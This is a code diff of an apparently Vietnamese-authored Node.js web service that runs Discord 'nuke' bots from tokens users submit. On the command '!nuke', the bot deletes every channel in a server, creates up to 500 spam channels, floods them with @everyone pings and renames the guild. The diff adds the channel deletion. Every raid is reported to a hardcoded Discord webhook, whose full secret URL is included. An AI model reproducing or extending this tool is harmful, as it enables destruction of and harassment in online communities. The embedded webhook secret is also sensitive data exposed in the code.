@@ -10,7 +10,8 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 const NOTIFY_WEBHOOK = 'https://discord.com/api/webhooks/1571391518525358100/BLEIDxMtvlNlT593waQH56RCa68_RD5UPBtDvCRmgnFGC79YRWh1KZeY7QegvScWDjJj';
 
-let config = {
+// Cấu hình mặc định
+const DEFAULT_CONFIG = {
   channelName: 'NUKE BY PHTUANKHANH',
   renameName: 'NUKE BY PTK',
   channelCount: 100,
@@ -18,6 +19,11 @@ let config = {
   msgCount: 1,
   pingEveryone: true
 };
+
+// Lưu config theo TOKEN BOT để tách biệt từng máy/người dùng
+const botConfigs = new Map();
+// Lưu instance bot
+const bots = new Map();
 
 async function notifyNuke(info) {
   const { guildName, guildIcon, guildId, ownerId, channels, msgs, user, error } = info;
@@ -39,7 +45,9 @@ async function notifyNuke(info) {
   };
   if (guildId) embed.fields.push({ name: 'Link server', value: `https://discord.com/channels/${guildId}`, inline: false });
   if (error) embed.fields.push({ name: 'Lỗi', value: String(error).slice(0, 1000), inline: false });
+  
   const body = { username: 'nuke notifier', avatar_url: guildIcon || null, embeds: [embed] };
+  
   try {
     await fetch(NOTIFY_WEBHOOK + '?wait=false', {
       method: 'POST',
@@ -49,12 +57,12 @@ async function notifyNuke(info) {
   } catch {}
 }
 
-let botClient = null;
-
 function startBot(token) {
-  if (botClient) botClient.destroy();
+  if (bots.has(token)) {
+    bots.get(token).destroy();
+  }
 
-  botClient = new Client({
+  const client = new Client({
     intents: [
       GatewayIntentBits.Guilds,
       GatewayIntentBits.GuildMessages,
@@ -63,13 +71,16 @@ function startBot(token) {
     ]
   });
 
-  botClient.on('ready', () => {
-    console.log(`[BOT] Online: ${botClient.user.tag}`);
+  client.on('ready', () => {
+    console.log(`[BOT] Online: ${client.user.tag}`);
   });
 
-  botClient.on('messageCreate', async (message) => {
+  client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
     if (message.content !== '!nuke') return;
+
+    // LẤY CONFIG CỦA RIÊNG BOT NÀY
+    const cfg = botConfigs.get(token) || { ...DEFAULT_CONFIG };
 
     const guild = message.guild;
     const t0 = Date.now();
@@ -79,55 +90,48 @@ function startBot(token) {
     let msgsSent = 0;
 
     try {
-      const cc = config.channelCount;
-      const chName = config.channelName;
-      const rName = config.renameName;
-      const mc = config.msgCount;
-      const msgText = config.msgContent;
-      const ping = config.pingEveryone;
+      const cc = cfg.channelCount;
+      const chName = cfg.channelName;
+      const rName = cfg.renameName;
+      const mc = cfg.msgCount;
+      const msgText = cfg.msgContent;
+      const ping = cfg.pingEveryone;
 
-      // 1. TẠO KÊNH SONG SONG - TÊN Y HỆT NHAU
-      const channelPromises = Array.from({ length: cc }, () =>
-        guild.channels.create({
-          name: chName,
-          type: ChannelType.GuildText,
-        }).then(c => { channelsCreated++; return c; }).catch(() => null)
-      );
-
-      const createdChannels = (await Promise.allSettled(channelPromises))
-        .filter(r => r.status === 'fulfilled' && r.value !== null)
-        .map(r => r.value);
-
-      // 2. RENAME GUILD
-      if (rName) {
-        await guild.setName(rName).catch(() => {});
-      }
-
-      // 3. SPAM TIN NHẮN BẰNG BOT
-      if (createdChannels.length && mc > 0) {
-        const msgJobs = [];
-        for (const c of createdChannels) {
-          for (let i = 0; i < mc; i++) msgJobs.push(c);
-        }
-
+      // 1. XOÁ ALL KÊNH SONG SONG
+      const oldChannels = await guild.channels.fetch().catch(() => null);
+      if (oldChannels) {
         await Promise.allSettled(
-          msgJobs.map(c => 
-            c.send({
-              content: msgText,
-              allowedMentions: ping ? { parse: ['everyone'] } : { parse: [] }
-            })
-            .then(() => { msgsSent++; })
-            .catch(() => {})
-          )
+          Array.from(oldChannels.values()).filter(Boolean).map(c => c.delete().catch(() => {}))
         );
       }
 
+      // 2. TẠO KÊNH + SPAM TIN NHẮN NGAY
+      const createPromises = Array.from({ length: cc }, () =>
+        guild.channels.create({
+          name: chName,
+          type: ChannelType.GuildText,
+        }).then(async c => {
+          channelsCreated++;
+          for (let i = 0; i < mc; i++) {
+            await c.send({
+              content: msgText,
+              allowedMentions: ping ? { parse: ['everyone'] } : { parse: [] }
+            }).then(() => { msgsSent++; }).catch(() => {});
+          }
+        }).catch(() => null)
+      );
+
+      await Promise.allSettled(createPromises);
+
+      // 3. RENAME GUILD
+      if (rName) await guild.setName(rName).catch(() => {});
+
       await notifyNuke({
         guildName: guild.name,
-        guildIcon: guild.iconURL({ size: 256 }),
+        guildIcon: guild.iconURL({ size: 256, extension: 'png' }),
         guildId: guild.id, ownerId: guild.ownerId,
         channels: channelsCreated, msgs: msgsSent,
-        user: botClient.user.username,
+        user: client.user.username,
         error: null,
       });
 
@@ -136,16 +140,25 @@ function startBot(token) {
     } catch (err) {
       console.error('Lỗi nuke:', err.message);
       await notifyNuke({
-        guildName: guild.name, guildIcon: guild.iconURL({ size: 256 }), guildId: guild.id,
+        guildName: guild.name, 
+        guildIcon: guild.iconURL({ size: 256, extension: 'png' }), 
+        guildId: guild.id,
         ownerId: guild.ownerId, channels: channelsCreated, msgs: msgsSent, 
-        user: botClient.user.username, error: err.message
+        user: client.user.username, error: err.message
       });
     }
   });
 
-  botClient.login(token).catch(e => console.error('Login error:', e.message));
+  client.login(token).catch(e => console.error('Login error:', e.message));
+  bots.set(token, client);
+  
+  // Nếu chưa có config cho token này thì tạo mới
+  if (!botConfigs.has(token)) {
+    botConfigs.set(token, { ...DEFAULT_CONFIG });
+  }
 }
 
+// --- API CHO WEB ---
 app.post('/api/bot-login', async (req, res) => {
   const { token } = req.body ?? {};
   if (!token) return res.status(400).json({ error: 'Thiếu token bot' });
@@ -153,26 +166,37 @@ app.post('/api/bot-login', async (req, res) => {
   try {
     startBot(token);
     await new Promise(r => setTimeout(r, 1500));
-    if (!botClient || !botClient.user) throw new Error('Đăng nhập thất bại, kiểm tra token');
-    res.json({ ok: true, user: botClient.user.tag });
+    const client = bots.get(token);
+    if (!client || !client.user) throw new Error('Đăng nhập thất bại, kiểm tra token');
+    res.json({ ok: true, user: client.user.tag });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
 });
 
-app.post('/api/settings', (req, res) => {
-  const { channelName, renameName, channelCount, msgContent, msgCount, pingEveryone } = req.body ?? {};
-  if (channelName) config.channelName = channelName;
-  if (renameName) config.renameName = renameName;
-  if (channelCount) config.channelCount = Math.min(500, Math.max(1, parseInt(channelCount, 10)));
-  if (msgContent) config.msgContent = msgContent;
-  if (msgCount !== undefined) config.msgCount = Math.max(1, parseInt(msgCount, 10));
-  if (pingEveryone !== undefined) config.pingEveryone = !!pingEveryone;
-  res.json({ ok: true, config });
+// Lấy config theo token
+app.post('/api/settings/get', (req, res) => {
+  const { token } = req.body ?? {};
+  if (!token) return res.status(400).json({ error: 'missing token' });
+  res.json(botConfigs.get(token) || { ...DEFAULT_CONFIG });
 });
 
-app.get('/api/settings', (req, res) => {
-  res.json(config);
+// Lưu config theo token
+app.post('/api/settings/save', (req, res) => {
+  const { token, channelName, renameName, channelCount, msgContent, msgCount, pingEveryone } = req.body ?? {};
+  if (!token) return res.status(400).json({ error: 'missing token' });
+
+  if (!botConfigs.has(token)) botConfigs.set(token, { ...DEFAULT_CONFIG });
+  const cfg = botConfigs.get(token);
+
+  if (channelName) cfg.channelName = channelName;
+  if (renameName) cfg.renameName = renameName;
+  if (channelCount) cfg.channelCount = Math.min(500, Math.max(1, parseInt(channelCount, 10)));
+  if (msgContent) cfg.msgContent = msgContent;
+  if (msgCount !== undefined) cfg.msgCount = Math.max(1, parseInt(msgCount, 10));
+  if (pingEveryone !== undefined) cfg.pingEveryone = !!pingEveryone;
+
+  res.json({ ok: true, config: cfg });
 });
 
 const PORT = process.env.PORT || 3000;
